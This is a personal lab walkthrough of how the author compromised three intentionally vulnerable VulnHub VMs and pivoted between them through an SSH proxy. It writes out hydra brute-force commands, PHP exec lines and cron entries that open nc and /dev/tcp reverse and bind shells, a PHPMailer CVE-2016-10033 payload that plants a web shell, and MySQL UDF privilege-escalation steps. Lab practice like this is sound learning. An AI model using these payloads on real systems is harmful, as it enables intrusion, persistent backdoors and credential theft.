# Trio
This write-up is for a virtual network I created using VirtualBox and three machines from [vulnhub](https://www.vulnhub.com/). The focus of this excersice was learning how to pivot between devices, C2 management, and anti-network-forensics.

## Scope
- [Mr Robot VM](https://www.vulnhub.com/entry/mr-robot-1,151/)
- [Metasploitable 2 VM](https://www.vulnhub.com/entry/metasploitable-2,29/)
- [Raven 2 VM](https://www.vulnhub.com/entry/raven-2,269/)

## Workflow
This is a operational breakdown of the steps taken to compromise the three VMs.

### Metasploitable 2 VM
#### Gaining Access
After running my [pentest](https://github.com/montyonsecurity/pentest) script on the target, the VSFTPd service was discovered and is vulnerable to [backdoor command execution](https://www.exploit-db.com/exploits/17491).

Executing EDB-ID:17491 with the Metasploit Framework Console gives root access to the machine.

Perstistance was established two ways:
- SSH Keys for the root account
- MSFVenom meterpreter payload calls back on a  \* \* \* \* \*  cron under root

### Mr Robot VM
#### Gaining Access
The main constraint here is that my attack box cannot directly send this VM any suspicious traffic, it has to all come from (or look like it is comming from) the Metasploitable 2 VM.

To achieve this, I read the man pages for proxychains and SSH, only to realize you can use proxychains to route traffic through a SSH via dynamic port forwarding. So I automated [this](https://github.com/montyonsecurity/sshproxy).

After setting the Metasploitable 2 VM as the proxy, I was then able to perform active recon on the Mr Robot VM without directly touching it.

Using dirb, I routed my traffic through the SSH proxy and enumerated a /wp-login page. Given that this is a machine inspired my the well recieved "Mr Robot" TV series, I used cewl to build a wordlist from the [Mr Robot Fandom](mrrobot.fandom.com/wiki/Mr_Robot_Wiki)
	
	proxychains dirb https://192.168.56.109

Using the resulting wordlist, I used hydra to enumerate *elliot* as a user. I then used cewl again to create a wordlist from [Elliot's fandom](mrrobot.fandom.com/wiki/Elliot_Alderson). Using that, I enumerated his password to be his employee number, ER28-0652.
	
	cewl -v -w mr_robot https://mrrobot.fandom.com/wiki/Mr_Robot_Wiki
	proxychains hydra -L mr_robot -p idc 192.168.56.109 http-form-post "/wp-login:log=^USER^&pwd=^PASS^:Invalid"
	cewl -v -w ell https://mrrobot.fandom.com/wiki/Elliot_Alderson
	proxychains hydra -l elliot -P ell 192.168.56.109 http-form-post "/wp-login:log=^USER^&pwd=^PASS^:Incorrect"

I edited the 404.php page template to include a system call to open a reverse shell pointing to the Metasploitable 2 VM, resulting in www-data access

#### Maintaining Persistence
I edited multiple PHP files on the web server to include system calls for and mix of binded ports and reverse shells
	
	exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.111/5253 0>&1'");
	exec("/bin/bash -c 'nc -lnvp 5253 -e /bin/bash'");

I also set a cron under www-data for a reverse shell
	
	echo "* * * * * nc 192.168.56.111 5253 -e /bin/bash 2> /dev/null" > tmp && crontab tmp && rm tmp

#### Privelege Escalation
Nmap is installed as root and has interactive mode, running *nmap --interactive* gives you an EUID of 0.

After uploading running [thief](https://github.com/montyonsecurity/thief), it was discovered that the user robot can sudo

#### Perstistance
Using the access that the EUID gives me, I exported a copy of the shadow file with SSH and cracked robot's password

Now I have mutiple shells for www-data, SSH access for robot, and a way to get a EUID of root.

### Raven 2 VM
#### Gaining Access
The file /vendor/VERSION on the web server running exposes the version number for the PHPMailer running on the webserver, which is vulnerable to [CVE: 2016-10033](https://www.exploit-db.com/exploits/40974). /contact.php was identified as the page running PHPMailer. The exploit was configured to drop a reverse shell that calls back to the Metasploitable 2 VM

#### Maintaining Persistence
When I exploited CVE: 2016-10033, I uploaded a shell.php file to the web server that, when invoked, uses a system call to initiate a reverse shell
	
	target = 'http://192.168.56.110/contact.php'
	backdoor = '/shell.php'
	payload '<?php system(\'nc 192.168.56.111 7777 -e /bin/bash\'); ?>'
	fields={'action':'submit',
		'name': payload,
		'email':'"anacoder\\\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server\" @protonmail.com',
		'message':'Pwned'}

I also set a binded port on www-data's cron
	
	echo "* * * * * nc -lnvp 7777 -e /bin/bash 2> /dev/null" > tmp && crontab tmp && rm tmp

#### Privelege Escalation
With www-data access, I uploaded [thief](https://github.com/montyonsecurity/thief) and enumerated a SQL instance running as root

Used *find* to locate all files that may contain credentials for the SQL server
	
	find / $(pwd) -type f -name "**.php" 2> /dev/null*

Found root's SQL password, logged in as root

Used [EDB-ID 1518](https://www.exploit-db.com/exploits/1518) to get root on the system
	
	Target Box (MySQL interpreter)
		select @@plugin_dir
		nc -lnvp 1337 > .sql.so

	Attack Box
		proxychains nc 192.168.56.110 1337 < raptor_udf2.so

	Target Box (MySQL interpreter)
		use mysql; create table foo(line blob); insert into foo values(load_file('/tmp/.sql.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/.sql.so'; create function do_system returns integer soname 'sql.so';

	Target Box (Bash interpreter)
		touch tmp && find tmp -exec '/bin/sh'
